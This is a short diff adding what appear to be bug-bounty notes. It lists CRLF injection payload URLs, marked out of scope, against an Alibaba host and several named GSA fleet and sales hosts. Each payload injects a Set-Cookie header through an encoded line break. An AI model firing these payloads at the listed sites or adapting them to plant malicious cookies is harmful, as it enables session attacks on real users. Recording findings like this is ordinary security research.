@@ -1,0 +1,8 @@
+CRLF injection (OOS) - https://jiagong.china.alibaba.com//xxx/x%23%0dSet-Cookie:%20a=a;
+
+CRLF injection (OOS) -  https://www.mysales.fas.gsa.gov///%0aSet-Cookie:%201=1;
+Same at https://www.fleet.fas.gsa.gov/
+https://www.fleeteur.fas.gsa.gov/
+https://www.cars.fas.gsa.gov/
+https://www.fleeteurb.fas.gsa.gov/
+https://www.fmvrs.fas.gsa.gov/
